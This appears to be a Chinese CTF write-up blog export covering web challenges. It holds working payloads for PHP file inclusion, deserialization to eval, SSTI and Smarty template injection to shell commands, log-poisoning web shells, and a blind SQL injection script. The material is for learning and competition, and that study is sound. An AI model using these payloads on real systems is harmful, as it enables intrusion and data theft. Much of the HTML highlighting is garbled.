class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        main()    ```  得到`glzjin_wants_a_girl_friend.<span class="hljs-built_in">zip</span>`源码     ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/b7c5c05c1929a09f.png)     `前端应用逻辑的基础在 controller 文件夹下面，而其他文件都是基于 basecontroller.php 所以我们打开 basecontroller.php 文件进行代码审计`          ```php    private $viewPath;        public function loadView($viewName =<span class="hljs-string">&#x27;&#x27;</span>, $viewData = [])        &#123;            $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;            if(file_exists($this-&gt;viewPath))            &#123;                extract($viewData);                include $this-&gt;viewPath;            &#125;        &#125;</code></pre></code></pre><p><code>extract</code>可以进行变量覆盖     </p><p>找到<code>UserController.php</code>中调用了<code>loadView</code>且第二个参数可控      </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $params = $_REQUEST;        $userModel = <span class="hljs-keyword">new</span> UserModel();        $listData = $userModel-&gt;getPageList($params);        <span class="hljs-keyword">$this</span>-&gt;loadView(<span class="hljs-string">&#x27;userList&#x27;</span>, $listData );    &#125;</code></pre></code></pre><p>在<code>userindex.php</code>中</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($img_file)) &#123;    $img_file = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;&#125;$img_dir = dirname(<span class="hljs-keyword">__FILE__</span>) . $img_file;$img_base64 = imgToBase64($img_dir);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;</code></pre></code></pre><p>所以传入<code>img_file=/../flag.php</code>   </p><p>需要先进入<code>userIndex.php</code>，url中修改<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>源码中图片base64解码得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CJBCTF</title>
    <link href="/2021/07/11/CJBCTF/"/>
    <url>/2021/07/11/CJBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul><li>文件包含</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><span class="hljs-comment"></span><span class="hljs-comment">*/</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];    &#125;&#125;</code></pre></code></pre><p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p><p>看到include要想到伪协议了    </p><p>这里用<code>data://text/plain</code>     </p><p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png">    </p><p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>得到flag     </p><h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul><li>代码审计</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;        &#125;        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        var_dump($safe);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;        unserialize($info);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $hacker=<span class="hljs-keyword">new</span> Hacker();    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></code></pre><ul><li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p><p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png">    </p><p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p></li></ul><ul><li><p>第二种思路：利用<code>$safe</code><br>  根目录payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  <code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>这样穿越目录tql   </p><p>  读flagpayload：<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>CJBCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Newctf</title>
    <link href="/2021/06/02/newctf/"/>
    <url>/2021/06/02/newctf/</url>
    
    <content type="html"><![CDATA[<h2 id="2021-6-1萌新赛-easy-web"><a href="#2021-6-1萌新赛-easy-web" class="headerlink" title="2021.6.1萌新赛-easy_web"></a>2021.6.1萌新赛-easy_web</h2><p>hint:这个图片真好看呀，没啥隐藏的东西吧    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png">       </p><p>第一点：<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>这一串是123456的MD5       </p><p>第二点：<code>===</code>可以数组绕过        </p><p>第三点：<code>$array[++$c]=1</code>数组索引溢出，<code>$c=9223372036854775806</code>      </p><p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p><p>返回：   </p><pre><code>你觉得就这么简单吗？？？，可以告诉你密码哦！        password: xluoyyds123456@@@      </code></pre><p>然后是一个图片隐写，下载下来背景图片，后缀改为<code>.rar</code>       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png">         </p><p>输入密码得到flag    </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NEEPUCTF</title>
    <link href="/2021/05/27/NEEPUCTF/"/>
    <url>/2021/05/27/NEEPUCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>打开环境    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png"></p><p>就在这里，我居然没找到，太失败了   </p><h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%print()%&#125;</code>替代<br><code>.</code>用<code>[]</code>替换<br>过滤了类名，八进制或者Unicode均可绕过     </p><p>payload：<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p><p>转八进制     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$str=<span class="hljs-string">&#x27;read&#x27;</span>;$res=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($str);$i++)&#123;    $res.=<span class="hljs-string">&quot;\\&quot;</span>.decoct(ord($str[$i]));&#125;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;\n&quot;</span>;var_dump($res);</code></pre></code></pre><p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p><p>空格用<code>%09</code>代替     </p><p>最后读取flag过滤了<code>Neepu</code>，Unicode编码<br><code>cat /flag|base64</code>—&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/36675dab86b84736.png">    </p><p>WP是使用截断的方法读取flag的<br><code>&quot;c&quot;&quot;ut%09-c%092-40%09/fl&quot;&quot;ag&quot;</code><br>cut<br> <code>-c</code>:仅显示行中指定范围的字符；     </p><h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>打开环境是个登录框，万能密码即可登录<code>adwa&#39;=&#39;0</code><br>进入后是个小游戏<br><img src="https://ftp.bmp.ovh/imgs/2021/05/00e8b9a1dd156058.png">     </p><p>验证码图片的名字就是验证码，可以写脚本跑    </p><p>猜对五次后会进行跳转<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p><p>可以用为协议读取下源码<br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// create object</span><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;num&#x27;</span>] &gt;= <span class="hljs-number">5</span>) &#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;smarty/Smarty.class.php&#x27;</span>);    $smarty = <span class="hljs-keyword">new</span> Smarty;    $name = $_SESSION[<span class="hljs-string">&quot;username&quot;</span>];    $smarty-&gt;display(<span class="hljs-string">&#x27;string:恭喜 &#x27;</span>.$name.<span class="hljs-string">&#x27; 获得了胜利&#x27;</span>);&#125;</code></pre></code></pre><p><code>display</code>存在PHP模板注入     </p><p>名字改成模板注入语句即可<br>这里还有<code>disable_function</code>,可以用<code>shell_exec</code>    </p><p>WP的EXP：        </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&quot;http://neepusec.club:18943&quot;</span>s = requests.Session()<span class="hljs-comment">#payload = &quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>payload = <span class="hljs-string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>login_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload&#125;res0 = s.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data = login_data)res1 = s.get(url+<span class="hljs-string">&quot;/index.php&quot;</span>)reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res1.text)data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>):    res3 = s.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data)    reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res3.text)    data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(res3.text)!=<span class="hljs-number">3287</span>):        print(i)        print(res3.text)        <span class="hljs-keyword">break</span></code></pre></code></pre><p>另一种方法<a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">（日志包含）</a>：<br>日志路径<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png">       </p><p>写入一句话<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png"></p><p><a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p><p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">日志包含</a>     </p><hr><p><a href="https://www.anquanke.com/post/id/242237#h3-2">最后两题</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MTCTF CSICN</title>
    <link href="/2021/05/25/MTCISCN/"/>
    <url>/2021/05/25/MTCISCN/</url>
    
    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MT的第一题，时间盲注，但是常见的字符都过了<code>ascii</code>、<code>substr</code>,大于号小于号等于号，<code>lile</code>,<code>if</code>都过了，不会了   </p><p><code>W&amp;M</code> 的WP   </p><pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]    headers = &#123;        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>        &#125;    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))        <span class="hljs-comment">#print(passwd)</span>        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)        <span class="hljs-comment">#print(passwd)</span>        data = &#123;        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,        <span class="hljs-string">&#x27;password&#x27;</span>:passwd        &#125;        before_time = time.time()        r = req.post(url, data=data, headers=headers)        after_time = time.time()        <span class="hljs-comment">#print( r.text)</span>        offset = after_time - before_time        <span class="hljs-comment"># print(offset)</span>        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):        print(passwd)        res += <span class="hljs-built_in">chr</span>(j)        print(res)        <span class="hljs-keyword">break</span>    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>    ```    `case when`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    `regexp`正则匹配     这个匹配可以直接匹配到字符的十六进制，Mysql会将十六进制转换      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        <span class="hljs-comment">## easytricks </span>MT      也有SQL注入的点   ` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    %s----&gt;字符串      [sprintf格式化注入漏洞](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     `没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%<span class="hljs-number">1</span>$\）被替换为空`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     可以看到`%<span class="hljs-number">1</span>$`后的`<span class="hljs-string">&#x27;`被吞了      </span><span class="hljs-string"></span><span class="hljs-string">[MTCTF-2021 Write_Up by 打CTF不靠实力靠运气](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">##  easy_source   </span><span class="hljs-string">CISCN   </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">`.index.php.swo`    </span><span class="hljs-string"></span><span class="hljs-string">    ```php</span><span class="hljs-string">    &lt;?php</span><span class="hljs-string">    class User</span><span class="hljs-string">    &#123;</span><span class="hljs-string">        private static $c = 0;</span><span class="hljs-string"></span><span class="hljs-string">        function a()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function b()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function c()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function d()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function e()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function f()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function g()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function h()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function i()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function j()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function k()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function l()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function m()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function n()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function o()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function p()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function q()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function r()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function s()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function t()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string">        </span><span class="hljs-string">    &#125;</span><span class="hljs-string"></span><span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span><span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span><span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span><span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span><span class="hljs-string">    $method= new $rc($ra, $rb);</span><span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></code></pre><p>利用PHP原生类读取类中的注释<br><code>ReflectionMethod</code>  </p><p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>–&gt;$class类的名称      </p><p>–&gt;$name方法的名称         </p><p>或者<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p><p>$class_method–&gt;类的名称和方法的名称中间以<code>::</code>分割      </p><p>ReflectionMethod中的<code>getDocComment</code>可以返回注释 代码     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png">     </p><p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p><p>ReflectionMethod里的其他方法    </p><pre><code>```php$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 